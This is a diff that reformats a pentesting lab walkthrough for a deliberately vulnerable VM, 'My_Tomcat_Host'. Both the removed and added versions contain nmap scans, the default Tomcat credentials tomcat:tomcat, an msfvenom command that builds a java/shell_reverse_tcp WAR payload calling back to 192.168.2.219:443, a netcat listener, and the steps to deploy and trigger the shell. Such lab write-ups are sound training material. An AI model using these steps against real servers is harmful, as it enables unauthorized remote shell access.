@@ -1,104 +1,165 @@
-<div class="page">
-
 # My_Tomcat_Host
 
-\
+## Machine Information
 
-## 
+- **Machine:** My_Tomcat_Host
+- **Platform:** Offensive Pentesting Lab
 
-## My_Tomcat_Host
+---
 
-- **<span style="color:#060f94;">My_Tomcat_Host</span>** :-
+# Lab Setup
 
-<!-- -->
+1. Download the vulnerable machine.
+2. Import the OVA into VirtualBox.
+3. Start the virtual machine.
 
-- Download the machine .
-- Import the ova file in virtual box .
-- Then start the machine .
-
-<!-- -->
-
-- Not assign the ip :
+If the virtual machine does not obtain an IP address, verify the network adapter configuration in VirtualBox.
 
 ![](images/7-1.png)
 
-- If not show the ip then check network connection in virtul box .
+---
 
-1.  <span style="color:#f6d32d;">Recon and Enumeration</span> :
+# Reconnaissance
 
-- Run nmap command to scan :
+## Discover the Target
 
-<div class="codebox">
-
-    nmap -sn 192.168.2.0/24
-
-</div>
+```bash
+nmap -sn 192.168.2.0/24
+```
 
 ![](images/7-2.png)
 
-<div class="codebox">
+---
 
-    nmap -v -p- 192.168.2.135
+## Port Scan
 
-</div>
+```bash
+nmap -v -p- 192.168.2.135
+```
 
 ![](images/7-3.png)
 
-- Notable open ports : 22/tcp – SSH 8080/tcp – Apache Tomcat
+### Open Ports
 
-1.  <span style="color:#f6d32d;">Exploring Apache Tomcat</span> :
+| Port | Service |
+|------|---------|
+| 22 | SSH |
+| 8080 | Apache Tomcat |
 
-- Access Web Interface :
-- Navigate to : <http://192.168.2.135:8080/>
+---
 
-![](images/7-4.png) Default Tomcat page visible.
+# Apache Tomcat Enumeration
 
-- Tomcat Manager Login :
+## Access the Web Interface
+
+Browse to:
+
+```
+http://192.168.2.135:8080/
+```
+
+The default Apache Tomcat page is displayed.
+
+![](images/7-4.png)
+
+---
+
+## Tomcat Manager Login
+
+Open the Tomcat Manager interface.
 
 ![](images/7-5.png)
 
-- Common default creds : tomcat:tomcat admin:admin
+Common default credentials:
 
-![](images/7-6.png) Login successful with tomcat:tomcat
+```text
+tomcat : tomcat
+admin  : admin
+```
 
-1.  <span style="color:#f6d32d;">Uploading a Reverse Shell</span> :
+The credentials below successfully authenticate.
 
-- Creating JSP Reverse Shell :
-- Use msfvenom to create a WAR file :
+```text
+Username: tomcat
+Password: tomcat
+```
 
-<div class="codebox">
+![](images/7-6.png)
 
-    msfvenom -p java/shell_reverse_tcp LHOST=192.168.2.219 LPORT=443 -f war -o shell.war
+---
 
-</div>
+# WAR File Deployment
+
+## Generate a WAR Payload
+
+Create a Java WAR payload using **msfvenom**.
+
+```bash
+msfvenom \
+-p java/shell_reverse_tcp \
+LHOST=192.168.2.219 \
+LPORT=443 \
+-f war \
+-o shell.war
+```
 
 ![](images/7-7.png)
 
-- Upload WAR File : <http://192.168.2.135:8080/manager/html>
+---
+
+## Upload the WAR File
+
+Open the Tomcat Manager deployment page.
+
+```
+http://192.168.2.135:8080/manager/html
+```
 
 ![](images/7-8.png)
 
-- Deploy WAR File : Upload shell.war via Tomcat Manager.
+Deploy the generated **shell.war** file.
 
 ![](images/7-9.png)
 
-1.  <span style="color:#f6d32d;">Getting a Reverse Shell</span> :
+---
 
-- Start Listener :
+# Reverse Shell
 
-<div class="codebox">
+## Start a Netcat Listener
 
-    nc -lvnp 443
+```bash
+nc -lvnp 443
+```
 
-</div>
+---
 
-- Trigger Shell : Visit : <http://192.168.2.135:8080/shell/> Netcat
-  receives a connection.
+## Trigger the Payload
 
-<!-- -->
+Browse to:
 
-- Get the reverse shell :
+```
+http://192.168.2.135:8080/shell/
+```
+
+The Netcat listener receives an incoming connection.
+
+---
+
+## Reverse Shell Obtained
 
 ![](images/7-10.png)
 
-</div>
+---
+
+# Attack Flow
+
+1. Discover the target host.
+2. Enumerate open ports.
+3. Identify Apache Tomcat on port **8080**.
+4. Access the Tomcat Manager interface.
+5. Authenticate using valid credentials.
+6. Generate a WAR payload.
+7. Deploy the WAR file.
+8. Start a Netcat listener.
+9. Trigger the deployed application.
+10. Obtain a reverse shell.
